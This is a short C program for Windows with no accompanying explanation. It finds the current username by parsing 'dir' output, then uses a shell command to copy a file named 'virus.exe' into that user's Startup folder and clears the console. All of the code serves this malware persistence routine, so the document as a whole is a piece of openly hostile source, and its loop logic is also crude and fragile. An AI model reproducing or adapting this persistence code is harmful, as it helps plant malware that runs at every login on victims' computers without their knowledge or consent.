#include<stdio.h>
#include<Windows.h>

int copy(){
	char buf[1024], user[30], count = 0, i = 0, j = 0, flag = 0, step[500];
	FILE *fp;

	system("dir > list.txt");
	fp = fopen("list.txt", "r");
	fread(buf, 1, 1024, fp);

	while (1){

		if (buf[i] == '\\'){
			count++;
		}

		if (count == 2){
			i++;

			while (buf[i] != '\\'){
				user[j] = buf[i];
				i++;
				j++;
				flag = 1;
			}

		}

		if (flag == 1){
			user[j] = '\0';
			break;
		}

		i++;
	}
	fflush(stdin);
	sprintf(step, "copy virus.exe C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup", user);
	system(step);
	system("cls");
	return 0;
}